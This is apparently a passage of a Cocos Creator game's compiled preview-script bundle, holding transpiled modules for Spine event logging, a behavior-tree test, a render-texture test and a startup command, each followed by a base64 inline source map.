kuZ2V0VGltZSgpIC0gc3RhcnRUaW1lKSk7XHJcbiAgICAgICAgLy8gY29uc29sZS5sb2cocGFydGl0aW9ucywgXCI9PT09PlwiKTtcclxuICAgICAgICBjb25zb2xlLmxvZyhhcnIsIFwiPT09PlwiKTtcclxuICAgICAgICBhcnIuZm9yRWFjaCh2YWx1ZSA9PiB7XHJcbiAgICAgICAgICAgIGxldCBlbm1leU5vZGUgPSBjYy5pbnN0YW50aWF0ZSh0aGlzLmVudGl0eU5vZGUpO1xyXG4gICAgICAgICAgICBlbm1leU5vZGUucG9zaXRpb24gPSB2YWx1ZS5jZW50ZXI7XHJcbiAgICAgICAgICAgIHRoaXMuZW5lbXlMYXllci5hZGRDaGlsZChlbm1leU5vZGUpO1xyXG5cclxuICAgICAgICAgICAgdGhpcy5nZXRDb21wb25lbnQoTG9vc2VRdWFkVHJlZSkuaW5zZXJ0KGVubWV5Tm9kZS5nZXRDb21wb25lbnQoRW5lbXkpLmVuZW15QUFCQik7XHJcbiAgICAgICAgfSk7XHJcbiAgICAgICAgLy8gcGFydGl0aW9ucyA9IHRoaXMucmFuZG9tRW50aXR5KHBhcnRpdGlvbnMpO1xyXG4gICAgICAgIC8vIHBhcnRpdGlvbnMuZm9yRWFjaCh2YWx1ZSA9PiB0aGlzLmdyYXBoaWNzLnJlY3QodmFsdWUueE1pbiwgdmFsdWUueU1pbiwgdmFsdWUud2lkdGgsIHZhbHVlLmhlaWdodCkpO1xyXG4gICAgICAgIHRoaXMuc2NoZWR1bGUoKCk9PntcclxuICAgICAgICAgICAgaWYgKGNvdW50IDwgMTApe1xyXG4gICAgICAgICAgICAgICAgbGV0IHN0YXJ0VGltZSA9IG5ldyBEYXRlKCkuZ2V0VGltZSgpO1xyXG4gICAgICAgICAgICAgICAgbGV0IHJlY3QgPSBTcGFjZVBhcnRpdGlvbi5yYW5kb21TcGFjZShwYXJ0aXRpb25zLCByYWRpdXMqMiwgcmFkaXVzKjIpO1xyXG4gICAgICAgICAgICAgICAgaWYgKHJlY3Qpe1xyXG4gICAgICAgICAgICAgICAgICAgIGxldCBlbm1leU5vZGUgPSBjYy5pbnN0YW50aWF0ZSh0aGlzLmVudGl0eU5vZGUyKTtcclxuICAgICAgICAgICAgICAgICAgICBlbm1leU5vZGUucG9zaXRpb24gPSByZWN0LmNlbnRlcjtcclxuICAgICAgICAgICAgICAgICAgICB0aGlzLmVuZW15TGF5ZXIuYWRkQ2hpbGQoZW5tZXlOb2RlKTtcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgdGhpcy5nZXRDb21wb25lbnQoTG9vc2VRdWFkVHJlZSkuaW5zZXJ0KGVubWV5Tm9kZS5nZXRDb21wb25lbnQoRW5lbXkpLmVuZW15QUFCQik7XHJcbiAgICAgICAgICAgICAgICAgICAgY291bnQrKztcclxuICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyhcIueUn+aIkOaVsOmHjzpcIitjb3VudCtcIiDnlJ/miJDml7bpl7Q6XCIrKG5ldyBEYXRlKCkuZ2V0VGltZSgpIC0gc3RhcnRUaW1lKSk7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9LCAwLjExKTtcclxuXHJcbiAgICAgICAgdGhpcy5ncmFwaGljcy5zdHJva2UoKTtcclxuICAgIH1cclxuXHJcbiAgICAvLyB1cGRhdGUgKGR0KSB7fVxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/test/TestSpineEvent.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '90c1f8f8DJO3rWorMFglZHA', 'TestSpineEvent');
// script/test/TestSpineEvent.ts

Object.defineProperty(exports, "__esModule", { value: true });
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var TestSpineEvent = /** @class */ (function (_super) {
    __extends(TestSpineEvent, _super);
    function TestSpineEvent() {
        return _super !== null && _super.apply(this, arguments) || this;
    }
    TestSpineEvent.prototype.start = function () {
        var ske = this.getComponent(sp.Skeleton);
        ske.setEventListener(function (trackEntry, event) {
            var animationName = trackEntry.animation ? trackEntry.animation.name : "";
            console.log("[track %s][animation %s] event: %s, %s, %s, %s", trackEntry.trackIndex, animationName, event.data.name, event.intValue, event.floatValue, event.stringValue);
        });
    };
    TestSpineEvent = __decorate([
        ccclass
    ], TestSpineEvent);
    return TestSpineEvent;
}(cc.Component));
exports.default = TestSpineEvent;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvdGVzdC9UZXN0U3BpbmVFdmVudC50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7O0FBQ00sSUFBQSxLQUFzQixFQUFFLENBQUMsVUFBVSxFQUFsQyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQWlCLENBQUM7QUFHMUM7SUFBNEMsa0NBQVk7SUFBeEQ7O0lBYUEsQ0FBQztJQVRHLDhCQUFLLEdBQUw7UUFDSSxJQUFJLEdBQUcsR0FBRyxJQUFJLENBQUMsWUFBWSxDQUFDLEVBQUUsQ0FBQyxRQUFRLENBQUMsQ0FBQztRQUN6QyxHQUFHLENBQUMsZ0JBQWdCLENBQUMsVUFBQyxVQUFVLEVBQUUsS0FBSztZQUNuQyxJQUFJLGFBQWEsR0FBRyxVQUFVLENBQUMsU0FBUyxDQUFDLENBQUMsQ0FBQyxVQUFVLENBQUMsU0FBUyxDQUFDLElBQUksQ0FBQyxDQUFDLENBQUMsRUFBRSxDQUFDO1lBQzFFLE9BQU8sQ0FBQyxHQUFHLENBQUMsZ0RBQWdELEVBQUUsVUFBVSxDQUFDLFVBQVUsRUFBRSxhQUFhLEVBQUUsS0FBSyxDQUFDLElBQUksQ0FBQyxJQUFJLEVBQUUsS0FBSyxDQUFDLFFBQVEsRUFBRSxLQUFLLENBQUMsVUFBVSxFQUFFLEtBQUssQ0FBQyxXQUFXLENBQUMsQ0FBQztRQUM5SyxDQUFDLENBQUMsQ0FBQztJQUNQLENBQUM7SUFWZ0IsY0FBYztRQURsQyxPQUFPO09BQ2EsY0FBYyxDQWFsQztJQUFELHFCQUFDO0NBYkQsQUFhQyxDQWIyQyxFQUFFLENBQUMsU0FBUyxHQWF2RDtrQkFib0IsY0FBYyIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5jb25zdCB7Y2NjbGFzcywgcHJvcGVydHl9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbkBjY2NsYXNzXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIFRlc3RTcGluZUV2ZW50IGV4dGVuZHMgY2MuQ29tcG9uZW50IHtcclxuXHJcblxyXG5cclxuICAgIHN0YXJ0ICgpIHtcclxuICAgICAgICBsZXQgc2tlID0gdGhpcy5nZXRDb21wb25lbnQoc3AuU2tlbGV0b24pO1xyXG4gICAgICAgIHNrZS5zZXRFdmVudExpc3RlbmVyKCh0cmFja0VudHJ5LCBldmVudCkgPT4ge1xyXG4gICAgICAgICAgICBsZXQgYW5pbWF0aW9uTmFtZSA9IHRyYWNrRW50cnkuYW5pbWF0aW9uID8gdHJhY2tFbnRyeS5hbmltYXRpb24ubmFtZSA6IFwiXCI7XHJcbiAgICAgICAgICAgIGNvbnNvbGUubG9nKFwiW3RyYWNrICVzXVthbmltYXRpb24gJXNdIGV2ZW50OiAlcywgJXMsICVzLCAlc1wiLCB0cmFja0VudHJ5LnRyYWNrSW5kZXgsIGFuaW1hdGlvbk5hbWUsIGV2ZW50LmRhdGEubmFtZSwgZXZlbnQuaW50VmFsdWUsIGV2ZW50LmZsb2F0VmFsdWUsIGV2ZW50LnN0cmluZ1ZhbHVlKTtcclxuICAgICAgICB9KTtcclxuICAgIH1cclxuXHJcbiAgICAvLyB1cGRhdGUgKGR0KSB7fVxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/test/TestWait.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '1c768sedl9GM7v8nUM1WrZ/', 'TestWait');
// script/test/TestWait.ts

Object.defineProperty(exports, "__esModule", { value: true });
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var TestWait = /** @class */ (function (_super) {
    __extends(TestWait, _super);
    function TestWait() {
        return _super !== null && _super.apply(this, arguments) || this;
    }
    // LIFE-CYCLE CALLBACKS:
    // onLoad () {}
    TestWait.prototype.start = function () {
    };
    TestWait.prototype.update = function (dt) {
        this.getComponent('BehaviorTree').tick();
    };
    TestWait = __decorate([
        ccclass
    ], TestWait);
    return TestWait;
}(cc.Component));
exports.default = TestWait;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvdGVzdC9UZXN0V2FpdC50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7O0FBQ00sSUFBQSxLQUFzQixFQUFFLENBQUMsVUFBVSxFQUFsQyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQWlCLENBQUM7QUFHMUM7SUFBc0MsNEJBQVk7SUFBbEQ7O0lBZUEsQ0FBQztJQVhHLHdCQUF3QjtJQUV4QixlQUFlO0lBRWYsd0JBQUssR0FBTDtJQUVBLENBQUM7SUFFRCx5QkFBTSxHQUFOLFVBQVEsRUFBRTtRQUNOLElBQUksQ0FBQyxZQUFZLENBQUMsY0FBYyxDQUFDLENBQUMsSUFBSSxFQUFFLENBQUM7SUFDN0MsQ0FBQztJQWRnQixRQUFRO1FBRDVCLE9BQU87T0FDYSxRQUFRLENBZTVCO0lBQUQsZUFBQztDQWZELEFBZUMsQ0FmcUMsRUFBRSxDQUFDLFNBQVMsR0FlakQ7a0JBZm9CLFFBQVEiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJcclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5AY2NjbGFzc1xyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBUZXN0V2FpdCBleHRlbmRzIGNjLkNvbXBvbmVudCB7XHJcblxyXG5cclxuXHJcbiAgICAvLyBMSUZFLUNZQ0xFIENBTExCQUNLUzpcclxuXHJcbiAgICAvLyBvbkxvYWQgKCkge31cclxuXHJcbiAgICBzdGFydCAoKSB7XHJcblxyXG4gICAgfVxyXG5cclxuICAgIHVwZGF0ZSAoZHQpIHtcclxuICAgICAgICB0aGlzLmdldENvbXBvbmVudCgnQmVoYXZpb3JUcmVlJykudGljaygpO1xyXG4gICAgfVxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/test/TestRotation.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'cad22+MNstHcIlfr5+qbGo1', 'TestRotation');
// script/test/TestRotation.ts

Object.defineProperty(exports, "__esModule", { value: true });
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var NewClass = /** @class */ (function (_super) {
    __extends(NewClass, _super);
    function NewClass() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.camera = null;
        _this.sprite = null;
        return _this;
        // update (dt) {}
    }
    NewClass.prototype.start = function () {
        var texture = new cc.RenderTexture();
        texture.initWithSize(cc.visibleRect.width, cc.visibleRect.height);
        this.camera.targetTexture = texture;
        // texture['_premultiplyAlpha'] = true;
        this.sprite.spriteFrame = new cc.SpriteFrame(texture);
        // this.sprite.spriteFrame.srcBlendFactor = cc.macro.BlendFactor.ONE;
        // this.sprite.setState(cc.Sprite.State.GRAY);
        this.sprite.node.color = cc.Color.BLACK;
        this.sprite.node.opacity = 100;
        // this.node.runAction(cc.repeatForever(cc.rotateBy(3, 360)));
    };
    __decorate([
        property(cc.Camera)
    ], NewClass.prototype, "camera", void 0);
    __decorate([
        property(cc.Sprite)
    ], NewClass.prototype, "sprite", void 0);
    NewClass = __decorate([
        ccclass
    ], NewClass);
    return NewClass;
}(cc.Component));
exports.default = NewClass;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvdGVzdC9UZXN0Um90YXRpb24udHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7OztBQUNNLElBQUEsS0FBc0IsRUFBRSxDQUFDLFVBQVUsRUFBbEMsT0FBTyxhQUFBLEVBQUUsUUFBUSxjQUFpQixDQUFDO0FBRzFDO0lBQXNDLDRCQUFZO0lBQWxEO1FBQUEscUVBMEJDO1FBdkJHLFlBQU0sR0FBYSxJQUFJLENBQUM7UUFHeEIsWUFBTSxHQUFhLElBQUksQ0FBQzs7UUFtQnhCLGlCQUFpQjtJQUNyQixDQUFDO0lBaEJHLHdCQUFLLEdBQUw7UUFDSSxJQUFJLE9BQU8sR0FBRyxJQUFJLEVBQUUsQ0FBQyxhQUFhLEVBQUUsQ0FBQztRQUNyQyxPQUFPLENBQUMsWUFBWSxDQUFDLEVBQUUsQ0FBQyxXQUFXLENBQUMsS0FBSyxFQUFFLEVBQUUsQ0FBQyxXQUFXLENBQUMsTUFBTSxDQUFDLENBQUM7UUFDbEUsSUFBSSxDQUFDLE1BQU0sQ0FBQyxhQUFhLEdBQUcsT0FBTyxDQUFDO1FBQ3BDLHVDQUF1QztRQUN2QyxJQUFJLENBQUMsTUFBTSxDQUFDLFdBQVcsR0FBRyxJQUFJLEVBQUUsQ0FBQyxXQUFXLENBQUMsT0FBTyxDQUFDLENBQUM7UUFDdEQscUVBQXFFO1FBRXJFLDhDQUE4QztRQUM5QyxJQUFJLENBQUMsTUFBTSxDQUFDLElBQUksQ0FBQyxLQUFLLEdBQUUsRUFBRSxDQUFDLEtBQUssQ0FBQyxLQUFLLENBQUM7UUFDdkMsSUFBSSxDQUFDLE1BQU0sQ0FBQyxJQUFJLENBQUMsT0FBTyxHQUFHLEdBQUcsQ0FBQztRQUUvQiw4REFBOEQ7SUFDbEUsQ0FBQztJQXBCRDtRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsTUFBTSxDQUFDOzRDQUNJO0lBR3hCO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxNQUFNLENBQUM7NENBQ0k7SUFOUCxRQUFRO1FBRDVCLE9BQU87T0FDYSxRQUFRLENBMEI1QjtJQUFELGVBQUM7Q0ExQkQsQUEwQkMsQ0ExQnFDLEVBQUUsQ0FBQyxTQUFTLEdBMEJqRDtrQkExQm9CLFFBQVEiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJcclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5AY2NjbGFzc1xyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBOZXdDbGFzcyBleHRlbmRzIGNjLkNvbXBvbmVudCB7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLkNhbWVyYSlcclxuICAgIGNhbWVyYTpjYy5DYW1lcmEgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5TcHJpdGUpXHJcbiAgICBzcHJpdGU6Y2MuU3ByaXRlID0gbnVsbDtcclxuXHJcblxyXG5cclxuICAgIHN0YXJ0ICgpIHtcclxuICAgICAgICBsZXQgdGV4dHVyZSA9IG5ldyBjYy5SZW5kZXJUZXh0dXJlKCk7XHJcbiAgICAgICAgdGV4dHVyZS5pbml0V2l0aFNpemUoY2MudmlzaWJsZVJlY3Qud2lkdGgsIGNjLnZpc2libGVSZWN0LmhlaWdodCk7XHJcbiAgICAgICAgdGhpcy5jYW1lcmEudGFyZ2V0VGV4dHVyZSA9IHRleHR1cmU7XHJcbiAgICAgICAgLy8gdGV4dHVyZVsnX3ByZW11bHRpcGx5QWxwaGEnXSA9IHRydWU7XHJcbiAgICAgICAgdGhpcy5zcHJpdGUuc3ByaXRlRnJhbWUgPSBuZXcgY2MuU3ByaXRlRnJhbWUodGV4dHVyZSk7XHJcbiAgICAgICAgLy8gdGhpcy5zcHJpdGUuc3ByaXRlRnJhbWUuc3JjQmxlbmRGYWN0b3IgPSBjYy5tYWNyby5CbGVuZEZhY3Rvci5PTkU7XHJcblxyXG4gICAgICAgIC8vIHRoaXMuc3ByaXRlLnNldFN0YXRlKGNjLlNwcml0ZS5TdGF0ZS5HUkFZKTtcclxuICAgICAgICB0aGlzLnNwcml0ZS5ub2RlLmNvbG9yPSBjYy5Db2xvci5CTEFDSztcclxuICAgICAgICB0aGlzLnNwcml0ZS5ub2RlLm9wYWNpdHkgPSAxMDA7XHJcblxyXG4gICAgICAgIC8vIHRoaXMubm9kZS5ydW5BY3Rpb24oY2MucmVwZWF0Rm9yZXZlcihjYy5yb3RhdGVCeSgzLCAzNjApKSk7XHJcbiAgICB9XHJcblxyXG4gICAgLy8gdXBkYXRlIChkdCkge31cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/StartupCommand.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '1f4dfBMj31PKbFLl7ohviZN', 'StartupCommand');
// script/app/StartupCommand.ts

Object.defineProperty(exports, "__esModule", { value: true });
var AppConfig_1 = require("./config/AppConfig");
var Extend_1 = require("../../framework/extend/Extend");
var Music_1 = require("../../framework/audio/Music");
var View_1 = require("../../framework/component/View");
var Interceptor_1 = require("../../framework/interceptor/Interceptor");
var OpenViewInterceptor_1 = require("./interceptor/OpenViewInterceptor");
var CloseViewInterceptor_1 = require("./interceptor/CloseViewInterceptor");
var LoadSceneIntercetor_1 = require("./interceptor/LoadSceneIntercetor");
var LocalStorage_1 = require("../../framework/persistence/LocalStorage");
var World_1 = require("./info/World");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var StartupCommand = /** @class */ (function () {
    function StartupCommand() {
    }
    StartupCommand.prototype.execute = function () {
        var args = [];
        for (var _i = 0; _i < arguments.length; _i++) {
            args[_i] = arguments[_i];
        }
        return __awaiter(this, void 0, Promise, function () {
            var _this = this;
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve) { return __awaiter(_this, void 0, void 0, function () {
                        var manager;
                        return __generator(this, function (_a) {
                            console.log("StartupCommand==>", AppConfig_1.AppConfig.gameName, AppConfig_1.AppConfig.version);
                            LocalStorage_1.LocalStorage.prefix = AppConfig_1.AppConfig.GameID;
                            /** 设置帧率 */
                            cc.game.setFrameRate(60);
                            manager = cc.director.getCollisionManager();
                            // manager.enabled = true;
                            // manager.enabledDebugDraw = true;
                            // manager.enabledDrawBoundingBox = true;
                            console.log(Extend_1.ext.isIphoneX, "isIphoneX===>");
                            console.log(Extend_1.ext.isLandscape, "isLandscape===>");
                            //关闭debug
                            if (!AppConfig_1.AppConfig.isDebug) {
                                console.log = function () {
                                };
                            }
                            View_1.default.clickSoundCommand = "ClickSoundCommand";
                            /** 读取声音配置 */
                            Music_1.Music.init();
                            World_1.World.Storage.init();
                            /** 后台切入切出回调---引擎已经做了暂停游戏主循环。包含：游戏逻辑，渲染，事件处理，背景音乐和所有音效。所以我们一般情况下不需要做什么 */
                            /*cc.game.on(cc.game.EVENT_SHOW, function () {
                                console.log("cc.game.EVENT_SHOW============>");
                            });
                
                            cc.game.on(cc.game.EVENT_HIDE, function () {
                                console.log("cc.game.EVENT_HIDE============>");
                            });*/
                            /** 注册拦截器 */
                            Interceptor_1.Interceptor.register("OpenViewCommand", OpenViewInterceptor_1.default);
                            Interceptor_1.Interceptor.register("CloseViewCommand", CloseViewInterceptor_1.default);
                            Interceptor_1.Interceptor.register("LoadSceneCommand", LoadSceneIntercetor_1.default);
                            /** 开始加载 */
                            resolve(true);
                            return [2 /*return*/];
                        });
                    }); })];
            });
        });
    };
    StartupCommand = __decorate([
        ccclass("StartupCommand")
    ], StartupCommand);
    return StartupCommand;
}());
exports.default = StartupCommand;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL1N0YXJ0dXBDb21tYW5kLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFBQSxnREFBNkM7QUFFN0Msd0RBQWtEO0FBQ2xELHFEQUFrRDtBQUNsRCx1REFBa0Q7QUFDbEQsdUVBQW9FO0FBQ3BFLHlFQUFvRTtBQUNwRSwyRUFBc0U7QUFDdEUseUVBQW9FO0FBQ3BFLHlFQUFzRTtBQUN0RSxzQ0FBbUM7QUFFN0IsSUFBQSxLQUFzQixFQUFFLENBQUMsVUFBVSxFQUFsQyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQWlCLENBQUM7QUFHMUM7SUFBQTtJQWdFQSxDQUFDO0lBL0RTLGdDQUFPLEdBQWI7UUFBYyxjQUFPO2FBQVAsVUFBTyxFQUFQLHFCQUFPLEVBQVAsSUFBTztZQUFQLHlCQUFPOzt1Q0FBRSxPQUFPOzs7Z0JBQzFCLHNCQUFPLElBQUksT0FBTyxDQUFDLFVBQU0sT0FBTzs7OzRCQUM1QixPQUFPLENBQUMsR0FBRyxDQUFDLG1CQUFtQixFQUFFLHFCQUFTLENBQUMsUUFBUSxFQUFFLHFCQUFTLENBQUMsT0FBTyxDQUFDLENBQUM7NEJBQ3hFLDJCQUFZLENBQUMsTUFBTSxHQUFHLHFCQUFTLENBQUMsTUFBTSxDQUFDOzRCQUN2QyxXQUFXOzRCQUNYLEVBQUUsQ0FBQyxJQUFJLENBQUMsWUFBWSxDQUFDLEVBQUUsQ0FBQyxDQUFDOzRCQWVyQixPQUFPLEdBQUcsRUFBRSxDQUFDLFFBQVEsQ0FBQyxtQkFBbUIsRUFBRSxDQUFDOzRCQUNoRCwwQkFBMEI7NEJBQzFCLG1DQUFtQzs0QkFDbkMseUNBQXlDOzRCQUV6QyxPQUFPLENBQUMsR0FBRyxDQUFDLFlBQUcsQ0FBQyxTQUFTLEVBQUUsZUFBZSxDQUFDLENBQUM7NEJBQzVDLE9BQU8sQ0FBQyxHQUFHLENBQUMsWUFBRyxDQUFDLFdBQVcsRUFBRSxpQkFBaUIsQ0FBQyxDQUFDOzRCQUVoRCxTQUFTOzRCQUNULElBQUcsQ0FBQyxxQkFBUyxDQUFDLE9BQU8sRUFBQztnQ0FDbEIsT0FBTyxDQUFDLEdBQUcsR0FBRztnQ0FFZCxDQUFDLENBQUM7NkJBQ0w7NEJBRUQsY0FBSSxDQUFDLGlCQUFpQixHQUFHLG1CQUFtQixDQUFDOzRCQUc3QyxhQUFhOzRCQUNiLGFBQUssQ0FBQyxJQUFJLEVBQUUsQ0FBQzs0QkFFYixhQUFLLENBQUMsT0FBTyxDQUFDLElBQUksRUFBRSxDQUFDOzRCQUVyQix5RUFBeUU7NEJBQ3pFOzs7Ozs7aUNBTUs7NEJBRUwsWUFBWTs0QkFDWix5QkFBVyxDQUFDLFFBQVEsQ0FBQyxpQkFBaUIsRUFBRSw2QkFBbUIsQ0FBQyxDQUFDOzRCQUM3RCx5QkFBVyxDQUFDLFFBQVEsQ0FBQyxrQkFBa0IsRUFBRSw4QkFBb0IsQ0FBQyxDQUFDOzRCQUMvRCx5QkFBVyxDQUFDLFFBQVEsQ0FBQyxrQkFBa0IsRUFBRSw2QkFBbUIsQ0FBQyxDQUFDOzRCQUc5RCxXQUFXOzRCQUVYLE9BQU8sQ0FBQyxJQUFJLENBQUMsQ0FBQzs7O3lCQUNqQixDQUFDLEVBQUM7OztLQUNOO0lBL0RnQixjQUFjO1FBRGxDLE9BQU8sQ0FBQyxnQkFBZ0IsQ0FBQztPQUNMLGNBQWMsQ0FnRWxDO0lBQUQscUJBQUM7Q0FoRUQsQUFnRUMsSUFBQTtrQkFoRW9CLGNBQWMiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJpbXBvcnQge0FwcENvbmZpZ30gZnJvbSBcIi4vY29uZmlnL0FwcENvbmZpZ1wiO1xyXG5pbXBvcnQge0lDb21tYW5kfSBmcm9tIFwiLi4vLi4vZnJhbWV3b3JrL2ZhY2FkZS9JQ29tbWFuZFwiO1xyXG5pbXBvcnQge2V4dH0gZnJvbSBcIi4uLy4uL2ZyYW1ld29yay9leHRlbmQvRXh0ZW5kXCI7XHJcbmltcG9ydCB7TXVzaWN9IGZyb20gXCIuLi8uLi9mcmFtZXdvcmsvYXVkaW8vTXVzaWNcIjtcclxuaW1wb3J0IFZpZXcgZnJvbSBcIi4uLy4uL2ZyYW1ld29yay9jb21wb25lbnQvVmlld1wiO1xyXG5pbXBvcnQge0ludGVyY2VwdG9yfSBmcm9tIFwiLi4vLi4vZnJhbWV3b3JrL2ludGVyY2VwdG9yL0ludGVyY2VwdG9yXCI7XHJcbmltcG9ydCBPcGVuVmlld0ludGVyY2VwdG9yIGZyb20gXCIuL2ludGVyY2VwdG9yL09wZW5WaWV3SW50ZXJjZXB0b3JcIjtcclxuaW1wb3J0IENsb3NlVmlld0ludGVyY2VwdG9yIGZyb20gXCIuL2ludGVyY2VwdG9yL0Nsb3NlVmlld0ludGVyY2VwdG9yXCI7XHJcbmltcG9ydCBMb2FkU2NlbmVJbnRlcmNldG9yIGZyb20gXCIuL2ludGVyY2VwdG9yL0xvYWRTY2VuZUludGVyY2V0b3JcIjtcclxuaW1wb3J0IHtMb2NhbFN0b3JhZ2V9IGZyb20gXCIuLi8uLi9mcmFtZXdvcmsvcGVyc2lzdGVuY2UvTG9jYWxTdG9yYWdlXCI7XHJcbmltcG9ydCB7V29ybGR9IGZyb20gXCIuL2luZm8vV29ybGRcIjtcclxuXHJcbmNvbnN0IHtjY2NsYXNzLCBwcm9wZXJ0eX0gPSBjYy5fZGVjb3JhdG9yO1xyXG5cclxuQGNjY2xhc3MoXCJTdGFydHVwQ29tbWFuZFwiKVxyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBTdGFydHVwQ29tbWFuZCBpbXBsZW1lbnRzIElDb21tYW5kIHtcclxuICAgIGFzeW5jIGV4ZWN1dGUoLi4uYXJncyk6UHJvbWlzZXtcclxuICAgICAgICByZXR1cm4gbmV3IFByb21pc2UoYXN5bmMgcmVzb2x2ZSA9PiB7XHJcbiAgICAgICAgICAgIGNvbnNvbGUubG9nKFwiU3RhcnR1cENvbW1hbmQ9PT5cIiwgQXBwQ29uZmlnLmdhbWVOYW1lLCBBcHBDb25maWcudmVyc2lvbik7XHJcbiAgICAgICAgICAgIExvY2FsU3RvcmFnZS5wcmVmaXggPSBBcHBDb25maWcuR2FtZUlEO1xyXG4gICAgICAgICAgICAvKiog6K6+572u5bin546HICovXHJcbiAgICAgICAgICAgIGNjLmdhbWUuc2V0RnJhbWVSYXRlKDYwKTtcclxuICAgICAgICAgICAgLyoqICDniannkIblvJXmk47phY3nva4gKi9cclxuICAgICAgICAgICAgLypsZXQgcGh5c2ljc01hbmFnZXIgPSBjYy5kaXJlY3Rvci5nZXRQaHlzaWNzTWFuYWdlcigpO1xyXG4g